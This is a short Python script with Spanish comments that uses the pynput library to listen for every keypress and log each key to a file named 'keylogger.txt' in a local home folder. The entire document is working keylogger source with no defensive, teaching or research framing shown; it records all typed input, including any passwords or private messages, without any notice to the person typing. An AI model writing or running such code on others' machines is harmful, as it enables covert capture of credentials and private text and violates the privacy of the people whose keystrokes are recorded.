#importaciones necesarias
import pynput
from pynput.keyboard import Key, Listener
import logging

#Carpeta donde se guardará el registro
log_directory="/home/george/Documentos/"

#Configura el objeto que escribe el log

logging.basicConfig(
	filename=log_directory+"keylogger.txt",
	level=logging.DEBUG,
	format='%(message)s')

#Funcion que se ejecuta cuando una tecla se presiona
def keypress(Key):
	#Registra en el archivo log
	logging.info(str(Key))

#Enlaza la funcion al evento "Tecla presionada"
with Listener(on_press=keypress)as listener:
	listener.join()

